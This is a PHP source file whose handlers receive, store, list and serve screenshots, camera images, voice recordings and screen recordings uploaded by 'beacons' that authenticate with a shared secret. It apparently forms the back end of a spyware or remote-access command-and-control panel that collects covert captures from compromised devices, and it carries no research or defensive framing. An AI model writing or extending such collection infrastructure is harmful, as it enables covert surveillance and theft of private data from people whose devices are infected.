<?php
declare(strict_types=1);

function handleMediaUpload(): void {
    validateBeaconSecret();
    requireMethod('POST');
    $input = jsonInput();
    $uuid = trim($input['beacon_uuid'] ?? '');
    $data = $input['data'] ?? '';
    $type = $input['type'] ?? '';
    if (empty($uuid) || empty($data) || empty($type)) jsonError('Missing fields');
    $extMap = ['screenshot' => 'png', 'camera' => 'jpg', 'voice' => 'mp3', 'screen_record' => 'mp4'];
    $ext = $extMap[$type] ?? 'bin';
    $name = $type . '_' . time() . '.' . $ext;
    $dest = MEDIA_DIR . '/' . $name;
    file_put_contents($dest, base64_decode($data));
    $id = DB::connect()->insert('media', ['beacon_uuid' => $uuid, 'type' => $type, 'filename' => $name, 'path' => $dest, 'created_at' => now()]);
    jsonOut(['id' => $id, 'status' => 'uploaded'], 201);
}

function handleMedia(): void {
    $id = (int)($_GET['id'] ?? 0);
    if (!$id) { handleListMedia(); return; }
    $m = DB::connect()->findOne('media', 'id', $id);
    if (!$m) jsonError('Not found', 404);
    $ext = strtolower(pathinfo($m['filename'], PATHINFO_EXTENSION));
    $types = ['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif','webp'=>'image/webp','mp4'=>'video/mp4','webm'=>'video/webm','mp3'=>'audio/mpeg'];
    header('Content-Type: ' . ($types[$ext] ?? 'application/octet-stream'));
    readfile($m['path']); exit;
}

function handleListMedia(): void {
    $db = DB::connect();
    $uuid = $_GET['beacon_uuid'] ?? null;
    $media = $db->all('media');
    if ($uuid) $media = array_values(array_filter($media, fn($m) => ($m['beacon_uuid'] ?? '') === $uuid));
    usort($media, fn($a, $b) => strcmp($b['created_at'] ?? '', $a['created_at'] ?? ''));
    jsonOut($media);
}
